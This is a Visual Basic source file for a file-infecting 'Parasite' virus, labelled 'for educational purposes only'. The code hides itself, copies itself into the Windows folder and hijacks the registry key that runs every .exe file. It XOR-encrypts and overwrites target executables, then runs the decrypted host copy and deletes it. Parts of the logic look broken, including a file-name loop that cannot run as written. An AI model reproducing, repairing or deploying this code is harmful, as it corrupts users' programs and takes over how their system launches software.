'-----[ Parasite Virus ]-----'
'-----------------------------------
'Coded By The Napster ]:D
'For Educational Purposes Only
'-----------------------------------
'-----[ Variables And Stuff ]-----'
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Const STILL_ACTIVE As Long = &H103
Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
Dim Parasite As Object, ParasiteCode As String
Dim FileName As String, FileNum As Integer, i
Dim Host As Long, HProc As Long, HExit As Long
'-----[ Onload Event ]-----'
Private Sub Form_Load()
App.TaskVisible = False
Set Parasite = CreateObject("WScript.Shell")
If Dir("C:\Windows\Parasite.exe") = "" Then
FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\Windows\Parasite.exe"
End If
Parasite.RegWrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\", Chr(34) & "C:\Windows\Parasite.exe" & Chr(34) & " %1"
If Command <> "" Then ParasiteFile Command
End
End Sub
'-----[ The Parasite File Read ]-----'
Function ParasiteFile(theFile As String)
On Error Resume Next
FileNum = 1
ParasiteStart:
Open theFile For Binary Access Read As #1
ParasiteCode = Space(LOF(1))
Get #1, , ParasiteCode
Close #1
If Right(ParasiteCode, 8) <> "Parasite" Then Leech theFile, ParasiteCode: GoTo ParasiteStart
ParasiteCode = Left(ParasiteCode, (Len(ParasiteCode) - 8))
ParasiteCode = XORcrypt(ParasiteCode, Replace(theFile, " ", ""))
For i = 1 To Len(theFile) Step -1
If Mid(theFile, i, 1) = "\" Then GoTo NextPart
FileName = FileName & Mid(theFile, i, 1)
Next i
NextPart:
FileName = Left(FileName, (Len(FileName) - 4))
Do
If Dir("C:\" & FileName & FileNum & ".exe") = "" Then
Open "C:\" & FileName & FileNum & ".exe" For Binary Access Write As #2
Put #2, , ParasiteCode
Close #2
GoTo WatchForIt
End If
FileNum = FileNum + 1
Loop
WatchForIt:
Host = Shell("C:\" & FileName & FileNum & ".exe", vbNormalFocus)
HProc = OpenProcess(PROCESS_ALL_ACCESS, False, Host)
GetExitCodeProcess HProc, HExit
Do While HExit = STILL_ACTIVE
DoEvents
GetExitCodeProcess HProc, HExit
Loop
Kill "C:\" & FileName & FileNum & ".exe"
End Function
'-----[ Infect The File ]-----'
Function Leech(Target As String, theCode As String)
theCode = XORcrypt(theCode, "Parasite")
theCode = theCode & "Parasite"
Open Target For Binary Access Write As #3
Put #3, , theCode
Close #3
End Function
'-----[ Used To Encrypt The File ]-----'
Function XORcrypt(Stuff As String, Key As String) As String
Dim lonLoop As Long, XOR1 As Integer, XOR2 As Integer
For lonLoop = 1 To Len(Stuff)
XOR1 = Asc(Mid$(Stuff, lonLoop, 1))
XOR2 = Asc(Mid$(Key, ((lonLoop Mod Len(Key)) + 1), 1))
XORcrypt = XORcrypt + Chr(XOR1 Xor XOR2)
Next lonLoop
End Function
'-----[ EOF ]-----'
